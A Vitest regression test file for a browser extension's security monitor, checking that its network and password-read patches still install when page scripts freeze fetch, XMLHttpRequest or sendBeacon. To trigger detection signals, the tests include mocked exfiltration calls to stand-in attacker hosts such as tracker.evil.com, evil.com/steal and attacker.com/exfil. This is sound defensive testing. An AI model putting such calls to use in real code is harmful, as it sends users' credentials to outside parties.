// @vitest-environment happy-dom
//
// Regression coverage for the JS-behavior monitor's MAIN-world network patches
// when a target global (window.fetch / XMLHttpRequest.prototype.open+send /
// navigator.sendBeacon) has been hardened non-writable by another extension or a
// page-level anti-fingerprinting / bot-detection script.
//
// Pre-fix, the bare assignment in patchFetch/XHR/BeaconMonitoring threw and
// aborted the rest of initJsBehaviorMonitor, silently dropping every later patch
// (and the ns-config-ack handshake). Each test below freezes one global and
// asserts (a) init does not throw and (b) a LATER patch still installed.
//
// Each test imports a fresh module instance via vi.resetModules() so the
// module-scoped _*Patched flags start false and the patch path is actually
// exercised (a shared module would early-return after the first install).

import { afterEach, describe, expect, it, vi } from "vitest";

type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;
type Monitor = typeof import("../extension/src/content/js_behavior_monitor");

const restores: Array<() => void> = [];
let currentMod: Monitor | null = null;

/** Harden a property non-writable (configurable so afterEach can restore it). */
function freeze(obj: object, key: string): void {
  const target = obj as Record<string, unknown>;
  const value = target[key];
  Object.defineProperty(obj, key, { value, writable: false, configurable: true });
  restores.push(() => {
    Object.defineProperty(obj, key, { value, writable: true, configurable: true });
  });
}

async function freshMonitor(): Promise<Monitor> {
  vi.resetModules();
  currentMod = await import("../extension/src/content/js_behavior_monitor");
  return currentMod;
}

afterEach(() => {
  // Removes the fresh module's capturing 'submit' listener and clears its config
  // so any prototype wrappers it installed go inert before the next test.
  currentMod?._resetState();
  currentMod = null;
  while (restores.length) {
    const restore = restores.pop();
    try {
      restore?.();
    } catch {
      // Best effort; a still-frozen property must not fail teardown.
    }
  }
  document.body.innerHTML = "";
  vi.restoreAllMocks();
});

function credentialForm(): void {
  const form = document.createElement("form");
  const pw = document.createElement("input");
  pw.type = "password";
  form.appendChild(pw);
  document.body.appendChild(form);
}

describe("js behavior monitor: frozen MAIN-world globals do not abort init", () => {
  it("frozen window.fetch is caught; the later beacon patch still installs", async () => {
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(window, "fetch");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    // sendBeacon is patched AFTER fetch in the init sequence, so its signal proves
    // init continued past the frozen fetch.
    credentialForm();
    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-beacon",
      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
    );
  });

  it("frozen XMLHttpRequest.prototype.send is caught; the later beacon patch still installs", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(XMLHttpRequest.prototype, "send");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    credentialForm();
    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-beacon",
      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
    );
  });

  it("frozen navigator.sendBeacon is caught; the later credential-read patch still installs", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(navigator, "sendBeacon");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    // The credential-value getter is patched AFTER beacon; reading a password
    // value outside a submit must still emit, proving init continued.
    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);
    input.value = "secret123";
    void input.value;

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-credential-read",
      expect.objectContaining({ isInsideSubmitHandler: false }),
    );
  });

  it("does not leave _fetchPatched stuck: a re-sync after fetch becomes writable installs the patch", async () => {
    const native = vi.fn().mockResolvedValue(new Response());
    window.fetch = native as unknown as typeof window.fetch;
    Object.defineProperty(window, "fetch", { value: native, writable: false, configurable: true });
    restores.push(() => {
      Object.defineProperty(window, "fetch", { value: native, writable: true, configurable: true });
    });

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();

    // First sync: fetch is frozen, so the patch is skipped (caught), not marked done.
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // fetch becomes writable again, then a later ns-config re-sync re-runs init.
    Object.defineProperty(window, "fetch", { value: native, writable: true, configurable: true });
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // The retry must have installed the wrapper: a 3P fetch correlated with a
    // credential form submit now emits the exfil signal.
    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);
    form.dispatchEvent(new Event("submit", { bubbles: true }));
    window.fetch("https://attacker.com/exfil", { method: "POST" });

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-network",
      expect.objectContaining({ api: "fetch", destinationOrigin: "https://attacker.com" }),
    );
  });
});
